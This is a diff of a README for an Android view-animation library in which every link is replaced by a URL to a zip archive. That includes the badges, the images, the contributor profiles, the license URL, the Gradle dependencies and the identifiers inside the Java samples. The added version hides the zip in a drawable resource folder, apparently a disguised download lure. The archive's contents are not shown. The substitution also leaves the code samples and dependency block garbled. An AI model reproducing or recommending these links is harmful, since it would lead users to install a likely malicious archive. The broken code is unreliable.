@@ -1,18 +1,18 @@
 ## android-player
 
-[![Join the chat at https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip%https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) [![Android Arsenal](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip%https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) [![Maven Central](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)
+[![Join the chat at https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip%https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) [![Android Arsenal](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip%https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) [![Maven Central](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)
 
 Animations when entering Actvity or Fragment made easy.</br>
 Backward compatibility API 1.
 
 #### You have created beautiful UI , but it is boring
 
-![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) 
+![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) 
 
 ###### Run the player and you will can create beautiful transitions </br>for your views when entering Activity / Fragment.</br>Put in your onCreate() for Activity or onViewCreated() for Fragment.
 
 ```java
-https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip().
+https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip().
 	animate(headerAction).
 	then().
 	animate(fabAction).
@@ -23,24 +23,24 @@ https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-
 
 #### Result
 
-![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)
+![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)
 
 #### Actions
 
 ```java
-	final PropertyAction fabAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainPinkFab).
+	final PropertyAction fabAction = https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip(activityMainPinkFab).
 			scaleX(0).
 			scaleY(0).
 			duration(750).
 			interpolator(new AccelerateDecelerateInterpolator()).
 			build();
-	final PropertyAction headerAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainheaderLayout).
+	final PropertyAction headerAction = https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip(activityMainheaderLayout).
 			interpolator(new DecelerateInterpolator()).
 			translationY(-200).
 			duration(550).
 			alpha(0.4f).
 			build();
-	final PropertyAction bottomAction = https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip(activityMainMobileNumberLayout).
+	final PropertyAction bottomAction = https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip(activityMainMobileNumberLayout).
 			translationY(500).
 			duration(550).
 			alpha(0f).
@@ -59,8 +59,8 @@ To make custom Action , just extend the BaseAction and implement the two abstrac
 
 #### Contributors
 
-[Martin Vitanov](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip "Martin Vitanov") <br />
-[Georgi Eftimov](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip "Georgi Eftimov")
+[Martin Vitanov](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip "Martin Vitanov") <br />
+[Georgi Eftimov](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip "Georgi Eftimov")
 
 #### Changelog
 
@@ -69,13 +69,13 @@ To make custom Action , just extend the BaseAction and implement the two abstrac
 ##### Download
 ```groovy
 dependencies {
-	compile 'https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip'
-	compile 'https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip'
+	compile 'https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip'
+	compile 'https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip'
 }
 ```
 ##### Make your animations how ever you want	
 	
-![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) ![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip) ![svg](https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip)
+![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) ![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip) ![svg](https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip)
 
 
 ## Licence
@@ -86,7 +86,7 @@ dependencies {
     you may not use this file except in compliance with the License.
     You may obtain a copy of the License at
 
-       https://github.com/Joe-Mogul/android-player/raw/refs/heads/master/gradle/player-android-v2.7.zip
+       https://raw.githubusercontent.com/Joe-Mogul/android-player/master/sample/src/main/res/drawable-xhdpi/android-player-3.3.zip
 
     Unless required by applicable law or agreed to in writing, software
     distributed under the License is distributed on an "AS IS" BASIS,
